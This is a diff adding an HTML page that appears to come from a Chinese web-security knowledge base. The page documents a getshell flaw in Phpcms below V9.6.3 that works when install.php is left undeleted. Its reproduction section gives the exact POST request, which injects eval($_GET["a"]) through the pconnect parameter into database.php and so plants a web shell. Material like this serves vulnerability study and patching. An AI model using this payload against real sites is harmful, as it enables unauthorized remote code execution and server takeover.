@@ -1,0 +1,30 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="phpcms-v963-installphp-没有即使删除导致的getshell"><span class="csDE05BCC">Phpcms V9.6.3 install.php </span><span class="csECDA2D3">没有即使删除导致的</span><span class="csDE05BCC">getshell</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">比较鸡肋，需要在环境安装好了之后，</span><span class="cs8926E06">install.php</span><span class="cs9C1B1871">也没有被删除，才可以利用</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Phpcms &lt; V9.6.3</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs3A447A38"><span class="cs9FB05234">POST /install/install.php?step=installmodule</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">module=admin&amp;dbport=3306&amp;pconnect=eval($_GET[&quot;a&quot;])</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">这里控制的是</span><span class="cs8926E06"> pconnect</span><span class="cs9C1B1871">参数，因为默认它没有单引号比较好调试。注意这里如果不传</span><span class="cs8926E06">dbport</span><span class="cs9C1B1871">参数的话</span><span class="cs8926E06">database.php</span><span class="cs9C1B1871">里的</span><span class="cs8926E06">port</span><span class="cs9C1B1871">参数会置空，将会报错。就无法执行到后面的</span><span class="cs8926E06"> eval</span><span class="cs9C1B1871">了</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.6.3%20install.php%20%e6%b2%a1%e6%9c%89%e5%8d%b3%e4%bd%bf%e5%88%a0%e9%99%a4%e5%af%bc%e8%87%b4%e7%9a%84getshell_files/image0.png" width="560" height="169" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">被修改后的</span><span class="cs8926E06">database.php</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.6.3%20install.php%20%e6%b2%a1%e6%9c%89%e5%8d%b3%e4%bd%bf%e5%88%a0%e9%99%a4%e5%af%bc%e8%87%b4%e7%9a%84getshell_files/image1.png" width="560" height="462" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">url</span><span class="cs9C1B1871">：</span><span class="cs9FB05234">/caches/configs/database.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.6.3%20install.php%20%e6%b2%a1%e6%9c%89%e5%8d%b3%e4%bd%bf%e5%88%a0%e9%99%a4%e5%af%bc%e8%87%b4%e7%9a%84getshell_files/image2.png" width="560" height="206" alt="" style="border-width:0px;" /></span></p></body>
+</html>
